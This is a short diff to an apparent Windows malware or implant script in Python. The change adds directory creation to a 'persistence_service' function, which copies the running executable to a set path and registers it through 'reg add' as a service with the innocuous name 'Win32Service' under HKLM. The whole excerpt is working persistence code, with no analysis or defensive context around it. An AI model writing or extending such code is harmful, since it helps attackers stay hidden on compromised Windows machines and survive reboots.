@@ -167,6 +167,9 @@ def persistence_run(_pers_loc):
 
 def persistence_service(_pers_loc):
     if not os.path.exists(_pers_loc):
+        if not os.path.exists('\\'.join(_pers_loc.split('\\')[:-1])):
+            print("Directory to create: ", '\\'.join(_pers_loc.split('\\')[:-1]))
+            os.makedirs('\\'.join(_pers_loc.split('\\')[:-1]))
         shutil.copyfile(sys.executable, _pers_loc)
         subprocess.call('reg add HKLM\\SYSTEM\\CurrentControlSet\\Services\\Win32Service', shell=True)
         subprocess.call('reg add HKLM\\SYSTEM\\CurrentControlSet\\Services\\Win32Service '
